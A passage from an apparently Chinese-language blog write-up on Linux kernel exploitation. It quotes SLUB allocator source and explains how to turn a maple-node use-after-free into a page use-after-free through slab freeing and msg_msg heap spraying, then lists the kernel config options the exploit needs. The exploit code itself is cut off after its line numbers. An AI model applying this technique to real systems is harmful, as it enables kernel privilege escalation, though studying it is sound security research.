class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *</span></span><br><span class="line"><span class="function"><span class="title">kmem_cache_create_usercopy</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *name,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="keyword">slab_flags_t</span> flags,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="keyword">unsigned</span> <span class="keyword">int</span> useroffset, <span class="keyword">unsigned</span> <span class="keyword">int</span> usersize,</span></span></span><br><span class="line"><span class="params"><span class="function">		  <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">const</span> <span class="keyword">char</span> *cache_name;</span><br><span class="line">	<span class="keyword">int</span> err;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SLUB_DEBUG</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * If no slub_debug was enabled globally, the static key is not yet</span></span><br><span class="line"><span class="comment">	 * enabled by setup_slub_debug(). Enable it if the cache is being</span></span><br><span class="line"><span class="comment">	 * created with any of the debugging flags passed explicitly.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_DEBUG_FLAGS)</span><br><span class="line">		static_branch_enable(&amp;slub_debug_enabled);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">	mutex_lock(&amp;slab_mutex);</span><br><span class="line"></span><br><span class="line">	err = kmem_cache_sanity_check(name, size);</span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Refuse requests with allocator specific flags */</span></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; ~SLAB_FLAGS_PERMITTED) &#123;</span><br><span class="line">		err = -EINVAL;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Some allocators will constraint the set of valid flags to a subset</span></span><br><span class="line"><span class="comment">	 * of all flags. We expect them to define CACHE_CREATE_MASK in this</span></span><br><span class="line"><span class="comment">	 * case, and we&#x27;ll just provide them with a sanitized version of the</span></span><br><span class="line"><span class="comment">	 * passed flags.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	flags &amp;= CACHE_CREATE_MASK;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/* Fail closed on bad usersize of useroffset values. */</span></span><br><span class="line">	<span class="keyword">if</span> (WARN_ON(!usersize &amp;&amp; useroffset) ||</span><br><span class="line">	    WARN_ON(size &lt; usersize || size - usersize &lt; useroffset))</span><br><span class="line">		usersize = useroffset = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (!usersize)</span><br><span class="line">		s = __kmem_cache_alias(name, size, align, flags, ctor);</span><br><span class="line">	<span class="keyword">if</span> (s)</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line"></span><br><span class="line">	cache_name = kstrdup_const(name, GFP_KERNEL);</span><br><span class="line">	<span class="keyword">if</span> (!cache_name) &#123;</span><br><span class="line">		err = -ENOMEM;</span><br><span class="line">		<span class="keyword">goto</span> out_unlock;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	s = create_cache(cache_name, size,</span><br><span class="line">			 calculate_alignment(flags, align, size),</span><br><span class="line">			 flags, useroffset, usersize, ctor, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (IS_ERR(s)) &#123;</span><br><span class="line">		err = PTR_ERR(s);</span><br><span class="line">		kfree_const(cache_name);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">out_unlock:</span><br><span class="line">	mutex_unlock(&amp;slab_mutex);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (err) &#123;</span><br><span class="line">		<span class="keyword">if</span> (flags &amp; SLAB_PANIC)</span><br><span class="line">			panic(<span class="string">&quot;%s: Failed to create slab &#x27;%s&#x27;. Error %d\n&quot;</span>,</span><br><span class="line">				__func__, name, err);</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			pr_warn(<span class="string">&quot;%s(%s) failed with error %d\n&quot;</span>,</span><br><span class="line">				__func__, name, err);</span><br><span class="line">			dump_stack();</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br><span class="line">EXPORT_SYMBOL(kmem_cache_create_usercopy);</span><br></pre></td></tr></table></figure>

<p>在代码中会验证<code>usersize</code>是否为0，如果是则调用<code>__kmem_cache_alias</code>寻找可重用的<code>slab</code>如果找到了则直接退出</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *</span></span><br><span class="line"><span class="class">__<span class="title">kmem_cache_alias</span>(<span class="title">const</span> <span class="title">char</span> *<span class="title">name</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">size</span>, <span class="title">unsigned</span> <span class="title">int</span> <span class="title">align</span>,</span></span><br><span class="line"><span class="class">		   <span class="title">slab_flags_t</span> <span class="title">flags</span>, <span class="title">void</span> (*<span class="title">ctor</span>)(<span class="title">void</span> *))</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">	s = find_mergeable(size, align, flags, name, ctor);</span><br><span class="line">	<span class="keyword">if</span> (s) &#123;</span><br><span class="line">		s-&gt;refcount++;</span><br><span class="line"></span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Adjust the object sizes so that we clear</span></span><br><span class="line"><span class="comment">		 * the complete object on kzalloc.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		s-&gt;object_size = max(s-&gt;object_size, size);</span><br><span class="line">		s-&gt;inuse = max(s-&gt;inuse, ALIGN(size, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *)));</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (sysfs_slab_alias(s, name)) &#123;</span><br><span class="line">			s-&gt;refcount--;</span><br><span class="line">			s = <span class="literal">NULL</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>继续跟进函数，可以发现其内部其实就是调用了一个<code>find_mergeable</code>去寻找<code>slab</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">struct kmem_cache *<span class="title">find_mergeable</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> align,</span></span></span><br><span class="line"><span class="params"><span class="function">		<span class="keyword">slab_flags_t</span> flags, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">void</span> (*ctor)(<span class="keyword">void</span> *))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache</span> *<span class="title">s</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (slab_nomerge)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ctor)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	size = ALIGN(size, <span class="keyword">sizeof</span>(<span class="keyword">void</span> *));</span><br><span class="line">	align = calculate_alignment(flags, align, size);</span><br><span class="line">	size = ALIGN(size, align);</span><br><span class="line">	flags = kmem_cache_flags(size, flags, name);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (flags &amp; SLAB_NEVER_MERGE)</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">	list_for_each_entry_reverse(s, &amp;slab_caches, <span class="built_in">list</span>) &#123;</span><br><span class="line">		<span class="keyword">if</span> (slab_unmergeable(s))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (size &gt; s-&gt;size)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> ((flags &amp; SLAB_MERGE_SAME) != (s-&gt;flags &amp; SLAB_MERGE_SAME))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Check if alignment is compatible.</span></span><br><span class="line"><span class="comment">		 * Courtesy of Adrian Drzewiecki</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		<span class="keyword">if</span> ((s-&gt;size &amp; ~(align - <span class="number">1</span>)) != s-&gt;size)</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (s-&gt;size - size &gt;= <span class="keyword">sizeof</span>(<span class="keyword">void</span> *))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (IS_ENABLED(CONFIG_SLAB) &amp;&amp; align &amp;&amp;</span><br><span class="line">			(align &gt; s-&gt;align || s-&gt;align % align))</span><br><span class="line">			<span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> s;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而在函数内部则会校验前面提到的<code>flags</code>中不存在<code>SLAB_NEVER_MERGE</code>，随后遍历<code>slab_caches</code>全局链表使用<code>slab_unmergeable</code>函数查看是否可以重用</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">bool</span> slab_nomerge = !IS_ENABLED(CONFIG_SLAB_MERGE_DEFAULT);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">slab_unmergeable</span><span class="params">(struct kmem_cache *s)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (slab_nomerge || (s-&gt;flags &amp; SLAB_NEVER_MERGE))</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;ctor)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;usersize)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * We may have set a slab to be unmergeable during bootstrap.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (s-&gt;refcount &lt; <span class="number">0</span>)</span><br><span class="line">		<span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>该函数会依次验证是否开启<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项，<code>flags</code>标志位是否存在<code>SLAB_NERVER_MERGE</code>，是否存在构造函数，<code>usersize</code>是否为0，最后是引用次数小于0表示该slab准备释放无法重用。</p>
<p>以上就是<code>slab</code>重用的基本机制，从而可以得出，如果在开启了<code>CONFIG_SLAB_MERGE_DEFAULT</code>内核选项时存在<code>UAF</code>的<code>maple node</code>所在的<code>slab</code>是会进入到重用链表中取得，而后可以使用<code>msg_msg</code>结构体堆喷相同大小从而分配到<code>UAF</code>的<code>maple node</code>上去的。但是原文重点讲述了在没有开启<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项时如何解决。</p>
<p>首先现在的很多计算机采用的时<code>NUMA</code>架构，意味着对于每个CPU来说是存在两条链表来存放被释放的slab，首先是<code>cpu_slab</code>和<code>NODE</code>的<code>partial list</code>，又因为不存在<code>CONFIG_SLAB_MERGE_DEFAULT</code>选项的关系，被释放的slab是无法被申请重用的所以这里需要将<code>slab UAF</code>转化为<code>page UAF</code>。</p>
<p>原文在这里使用的方式是通过<code>clone</code>/<code>fork</code>大量进程来申请大量相同的<code>vma</code>树，然后让一个<code>slab</code>中的所有内容都为我们的<code>maple node</code>，此时可以释放掉每个<code>slab</code>的多余的内容只留下一个<code>object</code>，最后触发漏洞，使其也被释放掉。因为一整个<code>slab</code>上的所有对象都被释放掉了，也就意味着此<code>slab</code>会被强制释放，随后会进入<code>cpu_slab</code>，如果我们前面申请的大量相同进程导致其满了则会进入<code>node</code>的<code>partial list</code>如果也满了则会进入销毁<code>slab</code>的流程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __slab_free(struct kmem_cache *s, struct page *page,</span><br><span class="line">			<span class="keyword">void</span> *head, <span class="keyword">void</span> *tail, <span class="keyword">int</span> cnt,</span><br><span class="line">			<span class="keyword">unsigned</span> <span class="keyword">long</span> addr)</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">void</span> *prior;</span><br><span class="line">	<span class="keyword">int</span> was_frozen;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">page</span> <span class="title">new</span>;</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> counters;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">kmem_cache_node</span> *<span class="title">n</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ... ...</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (unlikely(!<span class="keyword">new</span>.inuse &amp;&amp; n-&gt;nr_partial &gt;= s-&gt;min_partial))</span><br><span class="line">		<span class="keyword">goto</span> slab_empty;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Objects left in the slab. If it was not on the partial list before</span></span><br><span class="line"><span class="comment">	 * then add it.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">if</span> (!kmem_cache_has_cpu_partial(s) &amp;&amp; unlikely(!prior)) &#123;</span><br><span class="line">		remove_full(s, n, page);</span><br><span class="line">		add_partial(n, page, DEACTIVATE_TO_TAIL);</span><br><span class="line">		stat(s, FREE_ADD_PARTIAL);</span><br><span class="line">	&#125;</span><br><span class="line">	spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">slab_empty:</span><br><span class="line">	<span class="keyword">if</span> (prior) &#123;</span><br><span class="line">		<span class="comment">/*</span></span><br><span class="line"><span class="comment">		 * Slab on the partial list.</span></span><br><span class="line"><span class="comment">		 */</span></span><br><span class="line">		remove_partial(n, page);</span><br><span class="line">		stat(s, FREE_REMOVE_PARTIAL);</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="comment">/* Slab must be on the full list */</span></span><br><span class="line">		remove_full(s, n, page);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	spin_unlock_irqrestore(&amp;n-&gt;list_lock, flags);</span><br><span class="line">	stat(s, FREE_SLAB);</span><br><span class="line">	discard_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里会验证数量是否满了，如果满了则会进入销毁流程调用<code>discard_slab</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">discard_slab</span><span class="params">(struct kmem_cache *s, struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	dec_slabs_node(s, page_to_nid(page), page-&gt;objects);</span><br><span class="line">	free_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>而<code>discard_slab</code>函数首先做的事是修改一些数据上的内容随后接着调用<code>free_slab</code></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">free_slab</span><span class="params">(struct kmem_cache *s, struct page *page)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (unlikely(s-&gt;flags &amp; SLAB_TYPESAFE_BY_RCU)) &#123;</span><br><span class="line">		call_rcu(&amp;page-&gt;rcu_head, rcu_free_slab);</span><br><span class="line">	&#125; <span class="keyword">else</span></span><br><span class="line">		__free_slab(s, page);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span> __free_slab(struct kmem_cache *s, struct page *page)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">int</span> order = compound_order(page);</span><br><span class="line">	<span class="keyword">int</span> pages = <span class="number">1</span> &lt;&lt; order;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (kmem_cache_debug_flags(s, SLAB_CONSISTENCY_CHECKS)) &#123;</span><br><span class="line">		<span class="keyword">void</span> *p;</span><br><span class="line"></span><br><span class="line">		slab_pad_check(s, page);</span><br><span class="line">		for_each_object(p, s, page_address(page),</span><br><span class="line">						page-&gt;objects)</span><br><span class="line">			check_object(s, page, p, SLUB_RED_INACTIVE);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	__ClearPageSlabPfmemalloc(page);</span><br><span class="line">	__ClearPageSlab(page);</span><br><span class="line">	<span class="comment">/* In union with page-&gt;mapping where page allocator expects NULL */</span></span><br><span class="line">	page-&gt;slab_cache = <span class="literal">NULL</span>;</span><br><span class="line">	<span class="keyword">if</span> (current-&gt;reclaim_state)</span><br><span class="line">		current-&gt;reclaim_state-&gt;reclaimed_slab += pages;</span><br><span class="line">	unaccount_slab_page(page, order, s);</span><br><span class="line">	__free_pages(page, order);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里做的事就是获得<code>page</code>的<code>order</code>去出<code>page-&gt;slab_cache</code>的指针，最后释放对应<code>page</code>。当释放<code>page</code>就好办了，可以大量堆喷<code>msg_msg</code>向<code>buddy system</code>申请page即可。</p>
<h3 id="综上，可得exp"><a href="#综上，可得exp" class="headerlink" title="综上，可得exp"></a>综上，可得exp</h3><p>可以预见的是，这一利用方法是不需要依赖任何地址的，但是这里想要跑通exp需要修改一下config文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CONFIG_NET_CLS_ROUTE4=y</span><br><span class="line">CONFIG_DUMMY=y </span><br><span class="line">CONFIG_NET_SCH_QFQ=y </span><br><span class="line">CONFIG_NET_CLS_BASIC=y</span><br></pre></td></tr></table></figure>

<p>(有点不想写exp了，如果没删这句话那下面exp就是原文的，如果删了就是自己写的<del>好像删了你们也看不到</del>)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span 